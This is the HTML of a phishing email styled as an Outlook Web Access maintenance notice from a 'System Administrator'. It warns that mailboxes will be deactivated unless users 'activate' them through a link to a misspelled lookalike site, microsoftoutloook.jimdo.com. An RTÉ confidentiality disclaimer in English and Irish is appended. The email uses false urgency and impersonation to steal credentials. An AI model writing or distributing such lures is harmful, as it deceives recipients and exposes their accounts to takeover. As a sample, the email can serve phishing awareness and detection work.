<html dir="ltr"><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style id="owaTempEditStyle"></style><style title="owaParaStyle"><!--P {
	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
}
--></style>
</head>
<body ocsi="x">
<div style="FONT-FAMILY: Tahoma; DIRECTION: ltr; COLOR: #000000; FONT-SIZE: x-small">
<div></div>
<div dir="ltr"><font color="#000000" size="2" face="Tahoma"></font>&nbsp;</div>
<div>Please be prepared for all systems to be offline for maintenance tomorrow night. No access to email, voicemail, Citrix, or mobile replication will be possible during the maintenance. All mailbox is undergoing regeneration to the new Microsoft outlook web
 access 2013. Inability to activate account will render your email in-activate. Activate by completing the Microsoft outlook web access page.
<a href="http://microsoftoutloook.jimdo.com/" target="_blank">Click Here</a> for activation.<br>
</div>
System Administrator. </div>

<BR>
<BR>
<font face="arial" size="2"><b>Disclaimer:</b>
The information in this e-mail is confidential and may be legally privileged. It is intended solely for the addressee. Access to this e-mail by anyone else is unauthorised. If you are not the intended recipient, any disclosure, copying, distribution, or any action taken or omitted to be taken in reliance on it, is prohibited and may be unlawful. Please note that emails to, from and within RT&Eacute; may be subject to the Freedom of Information Act 1997 and may be liable to disclosure.<BR>
<BR>
T&aacute; an t-eolas sa r&iacute;omhphost seo faoi r&uacute;n agus d'fh&eacute;adfadh s&eacute; a bheith faoi phribhl&eacute;id dhl&iacute;thi&uacute;il. Is ar an seola&iacute; amh&aacute;in at&aacute; s&eacute; d&iacute;rithe. N&iacute;l cead ag aon duine eile rochtain a fh&aacute;il ar an r&iacute;omhphost seo. Mura t&uacute; an faighteoir beartaithe, t&aacute; cosc ar aon nochtadh, c&oacute;ip&eacute;ail, d&aacute;ileadh, n&oacute; aon ghn&iacute;omh a dh&eacute;anamh n&oacute; a fh&aacute;g&aacute;il ar l&aacute;r i dtaca leis an r&iacute;omhphost agus d'fh&eacute;adfadh sin a bheith m&iacute;dhleathach. Tabhair ar aird le do thoil, d'fh&eacute;adfadh r&iacute;omhphost chuig, &oacute; agus laistigh de RT&Eacute; a bheith faoi r&eacute;ir an Achta um Shaor&aacute;il Faisn&eacute;ise 1997, agus d'fh&eacute;adfadh go nd&eacute;anfa&iacute; &eacute; a nochtadh.
</font>
</body>
</html>
